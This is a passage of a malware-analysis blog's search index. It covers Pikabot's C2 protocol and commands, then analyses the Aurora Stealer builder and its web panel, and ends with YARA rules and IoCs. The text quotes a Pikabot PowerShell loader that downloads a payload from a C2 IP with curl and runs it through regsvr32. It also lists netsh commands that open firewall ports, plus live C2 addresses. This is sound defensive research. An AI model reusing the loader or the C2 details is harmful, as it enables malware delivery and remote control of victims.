Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"C2 server communication The data collected is encoded using standard Base64 then encrypted using AES using the first 32-byte as the key and the first 16-byte of the key as the IV. then the data decoded with Base64 and sent to C2 server IP = 37.1.215.220 using POST request to the subdirectory messages/INJtv97YfpOzznVMY. The response is decoded in the same way too. The initial beacon contains user_id=Him3xrn9e\u0026team_id=JqLtxw1h hardcoded string added to IP parameters. The request header is included in the binary as follows: Content-Type: application/x-www-form-urlencoded\\\\r\\\\n Accept: */*\\\\r\\\\n Accept-Language: en-US,en;q=0.5\\\\r\\\\n Accept-Encoding: gzip, deflate\\\\r\\\\n User-Agent: %s\\\\r\\\\n The User-Agent is also in the binary, and it is: Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0) The response of the initial sent packet (knock) contains some commands to be executed on the victim machine: Response command whoami execute whoami /all command ipconfig execute ipconfig /all command screenshoot take a snapshot of all the running processes of the victim machine using CreateToolhel32Snashot, Process32FirstW and Process32NextW The data requested decoded in the following form to be sent to the attacker but to different subdirectory messages/ADXDAG6 { \"uuid\": \"%s\", \"additional_type\": \"%s\", \"data\": \" \" } How The Command are executed The malware add %SystemRoot%\\\\SysWoW64\\\\cmd.exe to the user environment variables and creates a pipe for covert communication and receiving the output. To get the output is uses the named pipe in PeekNamedPipe in an infinite loop and the break condition is when WaitForSingleObject sense an object state changing. ","date":"2023-07-31","objectID":"/pikabot/:2:12","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"C2 commands The Malware contains some other commands to do but not all of them are implemented yet. ","date":"2023-07-31","objectID":"/pikabot/:2:13","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"task If the command is task the malware do a specified task received from the C2 server, and it has some sub-commands: The output of the commands is sent to another subdirectory messages/TRCsUVyMigZyuUQ with the same encoding schema followed before. The commands are the following: knock timeout Seems to be not fully implemented but from the current state, it sends Knock Timeout Changed! to the server in the following JSON. It’s used to delay any code execution on the victim machine. {\"uuid\": \"%s\", \"task_id\": %s, \"execution_code\": %d, \"data\": \" additional Nothing new here, it has the same whoami, ipconfig and screenshoot commands explained before. dll (exe) Download another DLL or exe file and run it using Process injection technique. The bot responds with the following with the state of downloading process (in case of failure Download Failed!) and the state of the injection process (Injection Success! or Injection Failed!) but to another subdirectory messages/DPVHLqEWR4uBk {\"uuid\": \"%s\", \"file_hash\": \"%s\", \"task_id\": %s} shellcode Download a shellcode and run by injecting it in a target process. Same as the DLL case cmd Execute cmd commands on the target machine. It runs the command with the same method explained previously. ","date":"2023-07-31","objectID":"/pikabot/:2:14","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"balancer and init not implemented yet. ","date":"2023-07-31","objectID":"/pikabot/:2:15","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Another Variants sample There are some other variants of the malware loader contains PowerShell script encrypted and stored on the .rdata section and it used to start the downloaded DLL using regsvr32 the following example script from OALABS Blog $nonresistantOutlivesDictatorial = \"$env:APPDATA\\\\Microsoft\\\\nonresistantOutlivesDictatorial\\\\AphroniaHaimavati.dll\"; md $env:APPDATA\\\\Microsoft\\\\nonresistantOutlivesDictatorial; Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList '--url \u003chttps://37.1.215.220/messages/DBcB6q9SM6\u003e -X POST --insecure --output ', $nonresistantOutlivesDictatorial; Start-Sleep -Seconds 40; $ungiantDwarfest = Get-Content $env:APPDATA\\\\Microsoft\\\\nonresistantOutlivesDictatorial\\\\AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)}; Set-Content $env:APPDATA\\\\Microsoft\\\\nonresistantOutlivesDictatorial\\\\AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte; regsvr32 /s $env:APPDATA\\\\Microsoft\\\\nonresistantOutlivesDictatorial\\\\AphroniaHaimavati.dll; ","date":"2023-07-31","objectID":"/pikabot/:2:16","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Yara Rule rule pikabot{ meta: malware = \"Pikabot\" hash = \"11cbb0233aff83d54e0d9189d3a08d02a6bbb0ffa5c3b161df462780e0ee2d2d\" reference = \"https://d01a.github.io/\" author = \"d01a\" description = \"detect pikabot loader and core module\" strings: $s1 = { 8A 44 0D C0 ?? ?? 88 84 0D ?? ?? FF FF 4? 83 ?? ?? 7C ?? [0-16] (C7 45 | 88 95) } condition: uint16(0) == 0x5A4D and (uint32(uint32(0x3C)) == 0x00004550) and all of them } ","date":"2023-07-31","objectID":"/pikabot/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"IoCs IoC description dff2122bb516f71675f766cc1dd87c07ce3c985f98607c25e53dcca87239c5f6 packed loader 2411b23bab7703e94897573f3758e1849fdc6f407ea1d1e5da20a4e07ecf3c09 unpacked loader 59f42ecde152f78731e54ea27e761bba748c9309a6ad1c2fd17f0e8b90f8aed1 unpacked loader 37.1.215[.]220 C2 Server IP {99C10657-633C-4165-9D0A-082238CB9FE0} mutex value ","date":"2023-07-31","objectID":"/pikabot/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"References https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html https://www.zscaler.com/blogs/security-research/technical-analysis-pikabot https://n1ght-w0lf.github.io/tutorials/qiling-for-malware-analysis-part-1/ https://github.com/qilingframework/qiling https://anti-debug.checkpoint.com/techniques/assembly.html https://unprotect.it/technique/int-0x2d/ https://rayanfam.com/topics/defeating-malware-anti-vm-techniques-cpuid-based-instructions/ ","date":"2023-07-31","objectID":"/pikabot/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Pikabot deep analysis","uri":"/pikabot/"},{"categories":["Malware Analysis"],"content":"Aurora Stealer Builder","date":"2023-04-23","objectID":"/aurora-stealer-builder/","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Introduction in the previous article, I discussed what’s inside Aurora Stealer. After the release, @Gi7w0rm provided me samples of some versions of Aurora Stealer builder, a new version that was created recently and another one that was created in 2022. The newer version has some improvements in the builder and new features we will discuss in this article. Before we start this article, it is important to note that the Builder also contains and creates the Web panel to control the bots. This means the binaries we are looking at are actually a hybrid between a builder and a panel. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Startup info In main_main the first display page is prepared to accept the credentials of the user and start checking them. It first displays an ASCII art of the word Aurora and provides communication channels for contacting the Aurora developers. After the initial screen, it saves the UUID of the user, with the same function discussed before to make sure that only one user is using the builder. Then it asks for the login and password of the user ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Authentication method After the credentials where provided, it calls main_createAccess. it saves the string 123 It passes the directory ./cache/Auth.aurora to a function called main_exists that checks if the file exists or not. If it existed it will ask for hand deleting it, if not it will create it. It appends the UUID and the string AURORA_TECHNOLOGY and calculates the MD5 hash to it using the form \u003cUUID\u003eAURORA_TECNOLOGY after which it takes this hash to make a string in the following form: 123_aurora_\u003cMD5_OF(\u003cUUID\u003eAURORA_TECNOLOGY)\u003e_technology_123 Then the SHA1 hash is calculated for this string: It generates the first string again and its MD5 hash. It uses the MD5 hash as a key for the AES GCM encryption routine. The generated bytes are then written to ./cache/Auth.aurora To know what was written to the file, we can use this script: from Crypto.Cipher import AES import binascii # key is MD5 hash of \u003cUUID\u003eAURORA_TECHNOLOGY key = b\"\u003cKEY\u003e\" # Auth.aurora content cipher = \"\u003cCIPHER\u003e\" data = binascii.unhexlify(cipher) nonce, tag = data[:12], data[-16:] cipher = AES.new(key, AES.MODE_GCM, nonce) cleartext = cipher.decrypt_and_verify(data[12:-16], tag) print(cleartext) # cleartext is SHA1 hash of the string \"123_aurora_\u003cMD5_OF(\u003cUUID\u003eAURORA_TECNOLOGY)\u003e_technology_123 \" which shows us the SHA-1 Hash of the string: 123_aurora_\u003cMD5_OF(\u003cUUID\u003eAURORA_TECNOLOGY)\u003e_technology_123 ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Server Authentication check Going back to main_main , where it creates yet another hash: This time, the password and login is used to create a string using the following form \u003cLOGIN\u003e_*Aurora_2023_Technology_\u003cPASS\u003e. then it calculates the SHA1 hash of it.* Then, it calls main_server . This could be where the authentication of the user happens, just a hypothesis. it sleeps 1000000000 nanoseconds. Then it makes a TCP connection with 185.106.93.237:56763 which seems to be the server where user authentication is done. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Dynamic Key calculation If the connection is established, it calls main_DynamicKey which generates a key based on the current minutes in the current time, In America/Los_Angeles time format. and calculate the SHA1 hash of it. Back in the main_Server function the builder then puts all the hashes in JSON format to be sent to the server. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Server Response Info the remote server then verifies the given data and response with one of the few response strings below: Response Action HWID_BAD [Aurora] HWID has a different value on the license server, write support NOT_FOUND_ACCOUNT [Aurora] Account has been not found, wrong login or password. LOST_LICENSE [Aurora] License expired. DYNAMIC_KEY [Aurora] Dynamic key wrong, check time your OS or write support. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Network emulation I tried to emulate the C2 communication with fakenet. After a very long time trying to do that. it works to respond to it with the format of data it waits for, but there is something still missing. I edited the configs of the TCPListener of fakenet as can be seen below: In default.ini edit the default configs to the following: [RawTCPListener] Enabled: True Port: 56763 # port it comm over Protocol: TCP Listener: RawListener UseSSL: No Timeout: 100 Hidden: False # To read about customizing responses, see docs/CustomResponse.md Custom: sample_custom_response.ini Create or use the sample_custom_response.ini provided to contain the following, this is already set by default: [ExampleTCP] InstanceName: RawTCPListener TcpDynamic: CustomProviderExample.py The builder waits for a JSON string delimited by the character 0x0A if this is not in the response it will wait forever. As a result CustomProviderExample.py should contain a JSON string ending with 0x0A , I was testing with the following code: def HandleTcp(sock): \"\"\"Handle a TCP buffer. Parameters ---------- sock : socket The connected socket with which to recv and send data \"\"\" while True: try: data = None data = sock.recv(1024) except socket.timeout: pass if not data: break resp = b'{\"Test\":\"test\",\"Test2\":\"Test2\"}\\x0A' sock.sendall(resp) A value of the JSON string accepted must be the Dynamic key which is generated based on the local time of the user. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Anti-Debugging check This Dynamic key is calculated again and the two values are compared in order to check if the sample is being debugged. Nice! ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"License info and IP used The JSON strings also contain some other information about the User and the license Also, it contains an IP that is used later in some other interesting functions. the author expects only one IP to be used by the builder. It calls convTstring which takes a generic value -any type- and converts it to a string. I don’t really know why it calls convTstring as it is an IP it would be passed as a string in the JSON. maybe later we realize what’s going on here. We see some calls to runtime.newProc . This function generates a new go running function and put it in a running Queue of other go functions waiting to run. This is generated by the compiler when using go keyword. Interested topic hah? Read more about it here. Sadly it makes debugging more difficult. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Why network emulation doesn’t work well Back to the JSON data, it’s decoded with json.Unmashal function which takes a structure as an input and with the second parameter being the data in bytes. How is the data mapped to the structure? Well, according to Go documentation How does Unmarshal identify the fields in which to store the decoded data? For a given JSON key \"Foo\", Unmarshal will look through the destination struct’s fields to find (in order of preference): An exported field with a tag of \"Foo\" (see the Go spec for more on struct tags), An exported field named \"Foo\", or An exported field named \"FOO\" or \"FoO\" or some other case-insensitive match of \"Foo\". What happens when the structure of the JSON data doesn’t exactly match the Go type? Unmarshal will decode only the fields that it can find in the destination type So, we should guess the names of the JSON data. One of them is Dynamic key but we should figure out how it’s decoded. We can use the pattern of the previously sent data, It was called DK . Sadly, this and other attempts didn’t work. So, I will continue the other things only static in IDA. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Main Functionality The main functionality of the builder is invoked with a series of goroutine calls. Each called function is preparing some data to be used later or to start the server itself. This serves as the main function of the builder. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"IP Geolocation database The first function of the series of newProc calls is main_LoadToDB which loads a very huge file called geo.aurora that contains a list of IP ranges all over the world. Viewing the cross-reference we can deduce that it is used to identify the geo-location of a victim. A sample of the content of geo.Aurora can be seen below. The file contains ~380MB of data like this. [ { \"Country_short\": \"AU\", \"City\": \"Queensland\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.0.0\", \"Out\": \"1.0.0.255\" }, { \"Country_short\": \"CN\", \"City\": \"Fujian\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.1.0\", \"Out\": \"1.0.3.255\" }, { \"Country_short\": \"AU\", \"City\": \"Victoria\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.4.0\", \"Out\": \"1.0.7.255\" }, { \"Country_short\": \"CN\", \"City\": \"Guangdong\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.8.0\", \"Out\": \"1.0.15.255\" }, { \"Country_short\": \"JP\", \"City\": \"Tokyo\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.16.0\", \"Out\": \"1.0.16.255\" }, { \"Country_short\": \"JP\", \"City\": \"Tokyo\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.17.0\", \"Out\": \"1.0.31.255\" }, { \"Country_short\": \"CN\", \"City\": \"Guangdong\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.32.0\", \"Out\": \"1.0.63.255\" }, { \"Country_short\": \"JP\", \"City\": \"Hiroshima\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.64.0\", \"Out\": \"1.0.64.255\" }, { \"Country_short\": \"JP\", \"City\": \"Hiroshima\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.65.0\", \"Out\": \"1.0.66.255\" }, { \"Country_short\": \"JP\", \"City\": \"Hiroshima\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.67.0\", \"Out\": \"1.0.67.255\" }, { \"Country_short\": \"JP\", \"City\": \"Hiroshima\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.68.0\", \"Out\": \"1.0.68.127\" }, { \"Country_short\": \"JP\", \"City\": \"Miyagi\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.68.128\", \"Out\": \"1.0.69.255\" }, { \"Country_short\": \"JP\", \"City\": \"Hiroshima\", \"Region\": \"\", \"Zipcode\": \"\", \"Timezone\": \"\", \"In\": \"1.0.70.0\", \"Out\": \"1.0.71.255\" }, .... ] ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Bot state The second function is to get the status of the infected systems. This includes a check if the bot is active, the last connection time of the bot, and the current time. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Clear old screenshots The third function deletes all the screenshots stored in the bot directory! It sorts the pictures to be deleted by _ in it, then it gets what has ACTUAL word in it, lastly, it deletes the file extension .png from the string using strings.Trim and the new string should be a number as it calls strconv.atoi and then gets the current time. What a mess! It then proceeds to finally delete the file. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Command Receiver The next function is main_CommandReceiver. It queues the commands received by the builder. The function map.Range has the definition: func (m *Map) Range(f func(key, value any) bool) where f is a function called for each \u003ckey,value\u003e pair. So the variable CMD_QUEUE would contain the received commands. Going through the function main_CommandReceiver_func2 we see that the software first checks if the received command is STOP. If the STOP command is received, the builder exits. For all other commands, it goes to another function main_CommandReceiver_func2_1 . It’s expecting a 3-character long command MIX . It packs data about the victims with GZip and base64 encode it then, stores it back using map.store There were some log messages related to other commands here. However, I couldn’t figure out how the commands are treated. Based on the sample I discussed in a previous article, I guess this is connected to the messages sent from the victim machine. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Main server functionality The server is now ready to work and build the graphical interface of the builder to view the victim’s data and state and further use the victims as Bots and Stealer hosting servers using SFTP. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"server start! Next function is main_SERVER_func1 it calls main_ForwardPort with argument :7367 Then this function calls aurora_core_server__Server_Start , this long value is passed with the port number passed to its driver function This function starts the main server that displays the dashboard. I tried to adjust the execution to continue, but the program crashed. Note: SixSixSix is the author of the Stealer and not my username. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"TCP listener Back to function main_Server_0 (main_Server). It logs the start of the server in the main display. The server is started using net.Listen function that takes the protocol = tcp and port = 456 . ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:3:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Main Client After setting up the Server, the function main_server_func2 is called. This function only calls the main_Client function. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Handling incoming data To handle incoming data from the victim, the panel/builder reads the data on the listening port using bufio__Reader_ReadString. This data must be delimited by 0x0A as discussed previously. It comes in a compressed format, so the function main_uncompress is used to decompress it. To do so, the function takes the base64 encoded data and decodes it, then it is decompressed using GZip. You might remember from my last article, that this is the way the data was sent from the victim’s device. The data is in form of JSON so it’s extracted with a call to json.Unmarshal . The resulting data is then stored in a victim database file. The last message is additionally stored in the map function. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:4:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Update victims DB One of the first packets received from the victim is a large base64 blob. After decoding it using the above-mentioned method, it can be seen that this blob is a screenshot from the victim’s machine. This image is used to update the screenshot that contains _ACTUAL.png . The old one is then deleted. The other screenshots are stored in a similar way but the name is different. It updates the stolen victim data as well, and the last response from each infected host is stored in the previously created map. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:4:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"The victim’s Location identification main_GetGeo is then called. If we remember, the loaded JSON string was referenced in this function. It parses the string IP to convert to IP to a Go IP type which is a decimal dotted IP address. Then it goes through a very large loaded JSON string that contains every IP range associated to each region all over the world. The new victims will have an identifier is the string MIX that is checked to handle the new victims If the victim is new, it will store the screenshot with _ACTUAL tag as discussed before but there is no old one to delete. At the very end of the function, a call to main_Registration is made. This function just adds a new entry to the victims’ list and gets the geolocation of the victim. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:4:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Main web server At the beginning of the function main_Server there was a goroutine that I missed initially. It calls main_web before the call to net.Listen . main_web initializes the web interface of the builder and the dashboard with all of its functionality. the server starts at port 8181 . The function follows the same pattern to set the methods of the handler for APIs: The following table contains all available APIs with their associated handlers: API APIHandler name APIHandler address Description getbots main_web_func1 0x7635A0 List all the victims by walking through main_BOT_CONN map callback main_web_func2 0x763800 get the callback message of each victim through the main_BOT_LASTMESSAGE or Queriyng the raw query of the connection address and get the message associated with victim IP callback_STR main_web_func3 0x763A00 get the callback message string for each victim stored at main_BOT_LASTMESSAGE_STRING callback_ps main_web_func4 0x763C00 get the PowerShell response of each victim through main_BOT_POWERSHELL_MESSAGE or Queriyng the raw query of the connection address and get the PowerShell message. Statistic main_web_func5 0x763E00 shows statistics about the victims stored in .Aurora file in ./bots/ folder and redirects to web/statistic.html html template. The statistics show all the users with their IP addresses and geolocation send_pw main_web_func6 0x764428 sends a base64 encoded PowerShell command to the victim using the json format. The associated key in the query is argument string GiveMeBuild main_web_func7 0x7648E0 checks\\builds the executable file of the stealer .The build file is stored in .\\build it first checks if it exists on the system. if exists, tries to read it. If read is not successfully done, it exits. If not, the author prepared the file to be sent as an attachment for another remote system. it’s sent in the Content-deposition as follows: Content-Desposition: attachment = .exe send main_web_func8 0x764E60 sends cmd \\ PowerShell commands to the victims. They are sent through the argument key in the URL raw query sftp_stop_reverse main_web_func9 0x7655A0 closes the SFTP connection with the victims and closes the associated port forwarding functionality. Also, it deletes the entry associated with the deleted victim’s SFTP connection in main_BOT_CLIENT_SFTP map sftp_reverse main_web_func10 0x765820 start a SFTP server with the victim. the connection is done through port 7273 . The successful connection is indicated by WORK string. the configuration and data about the connection in the associated maps main_BOT_CLIENT_SFTP , main_BOT_LASTMESSAGE . This reverse shell is then used to host the stealer. The infected Bots can be used in DoS attacks too. screenshot main_web_func11 0x766540 Takes a screenshot of the victim, it first checks if it’s active. SHA1 hash is calculated to the png file to see if the screenshot is the same as the stored or not before updating the database of the victims. the process is identified by Bad or Good statement. bot main_web_func12 0x766C00 displays the status of the bots and all information , online boots its geo location, SFTP connected bots in the web/bot.html html template page. it also reads the content of ./core/scr_n_f.png but I don’t see any use of it. It encodes the data in it and then redirect to bot.html logout main_web_func13 0x767680 Logs out! auth main_web_func14 0x767780 Authenticate the access of the client. It uses the file ./cache/Auth.Aurora to compare its content with the newly calculated hashes as discussed before. dashboard main_web_func15 0x767BA0 The dashboard of the stealer, which shows some data about the active and offline Bots. del_cmd main_web_func16 0x768220 deletes a registered command from the main_CMD_QUEUE assigned to the victim commands main_web_func17 0x768380 display the command selection interface in the web/commands.html html template AddCommand main_web_func18 0x768840 add a new command to the victim commands list, it reads the assigned c","date":"2023-04-23","objectID":"/aurora-stealer-builder/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Older version of the builder There’s another sample provided to me, executable hash33fc61e81efa609df51277aef261623bb291e2dd5359362d50070f7a441df0ad This sample looks like it was one of the first trials of the author to create a stealer in Go. It depends on so many additional legitimate packages from GitHub to create the server and handle the database manipulation and some other things. In the newer builder, it seems like he got more familiar with the Go Language and didn’t rely on the packages from GitHub. The package used to grab the favicon (from the first GitHub account), create the GUI web application (the second account), provide sqlite3 interface and provide a library like ReadLine in C. The repositories are in the following table: Old sample New sample http://github.com/adampresley/gofavigrab http://github.com/vmihailenco/tagparser http://github.com/asticode/go-astikit http://github.com/vmihailenco/msgpack http://github.com/chzyer/readline http://github.com/go-telegram-bot-api/telegram-bot-api http://github.com/gorilla/mux http://github.com/jroimartin/gocui http://github.com/manifoldco/promptui http://github.com/mattn/go-runewidth http://github.com/nsf/termbox-go The old sample has some functions that were described before, which were extended in the 2023 version. The hash calculation method and dynamic key but instead of Aurora_Stealer_2023 it is Aurora_Stealer_2022. Then it connects to the remote server to authenticate the user data, to the IP 185.106.93.237:6969 using TCP protocol. Another dynamic key is used to authenticate with the server, based on the current time too however in the old sample the string Aurora_Stealer_SERVER is used. This key is sent to the remote server and calculated later in the following code to verify the user access and the dynamic key to make sure there is no debugging session started. If the keys do not match, the function breaks and the program is terminated. Another dynamic key is calculated but this time for the client, it uses the string Aurora_Stealer_2033 with the same timing method of calculation discussed. The hashes are stored then in ATX.Aurora in ./cache folder. It then checks the existence of some files: ./cache/ATX.Aurora , ./cache/telegram.Aurora , ./cache/Config.Aurora and ./cache/Trash . ./cache/Trash contains older Aurora executables, the older executables are auto-moved to this folder using PowerShell command, and the new version, which is expected to be in .zip format with the name Update.zip, is then unzipped and replaces the older version. The program is then restarted using PowerShell. This is all done in main_AutoUpdate function. The function main_ReadTGData reads telegram data from the file ./cache/telegram.Aurora which is AES encrypted. The authentication is done using a telegram bot through the telegram API. This authentication method is removed from the new version, where everything is done through communicating with the remote server. The old builder additionally contains an important function called main_LoadStealer . This function calls two other goroutines. both two functions execute PowerShell commands that configure the firewall to allow it to receive incoming TCP connections through Port 80 and 8081. #function main_LoadStealer_func2 allow it on local port 80 netsh advfirewall firewall add rule name=”Port 80 dir=in action=allow protocol=TCP localport=80 #function main_LoadStealer_func2 allow it on local port 80 netsh advfirewall firewall add rule name=”Port 8081 dir=in action=allow protocol=TCP localport=8081 At the end of the main function, it creates a new hidden instance of CMD and starts the Web service of the stealer. using the function main_StartWeb This function starts the web service on localhost http://127.0.0.1/dashboard . It has a different set of APIs and different associated handlers then the newer version. The command strings are highlighted. API APIHandler name APIHandler address Description receive main_StartWeb_func1 0x140421B00 It receive","date":"2023-04-23","objectID":"/aurora-stealer-builder/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Web service HTML templates You can find screenshots of the HTML templates in this tweet. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Yara Rules all the rules can be found here. new builder version rule aurora_stealer_builder_new{ meta: malware = \"Aurora stealer Builder new version 2023\" hash = \"ebd1368979b5adb9586ce512b63876985a497e1727ffbd54732cd42eef992b81\" reference = \"https://d01a.github.io/\" Author = \"d01a\" description = \"detect Aurora stealer Builder new version 2023\" strings: $is_go = \"Go build\" ascii $s1 = \"_Aurora_2023_Technology_\" ascii $s2 = \"AURORA_TECHNOLOGY\" ascii $s3 = \"scr_n_f.png\" ascii $s4 = \"EXTERNAL_RUN_PE_X64\" ascii $s5 = \"[Aurora]\" ascii //log messages begin with [Aurora] __LOGMSG__ $fun1 = \"main.Server\" ascii $fun2 = \"main.GetAcess\" ascii $fun3 = \"main.AddCommand\" ascii $fun4 = \"main.GetGeoList\" ascii $fun5 = \"main.GiveMeBuild\" ascii condition: uint16(0) == 0x5a4d and ( $is_go and (2 of ($s*)) and (2 of ($fun*)) ) } old builder version rule aurora_stealer_builder_old{ meta: malware = \"Aurora stealer Builder old version 2022\" hash1 = \"33fc61e81efa609df51277aef261623bb291e2dd5359362d50070f7a441df0ad\" reference = \"https://d01a.github.io/\" Author = \"d01a\" description = \"detect Aurora stealer Builder old version 2022\" strings: $is_go = \"Go build\" ascii $s1 = \"ATX.Aurora\" ascii $s2 = \"Aurora_Stealer_2033\" ascii $s3 = \"Aurora_Stealer_SERVER\" ascii $s4 = \"[Aurora Stealer]\" //log messages $fun1 = \"main.DecryptLog\" ascii $fun2 = \"main.CreateDB\" ascii $fun3 = \"main.GenerateKey\" ascii $fun4 = \"main.TGParce\" ascii condition: uint16(0) == 0x5a4d and ( $is_go and (2 of ($s*)) and (2 of ($fun*)) ) } 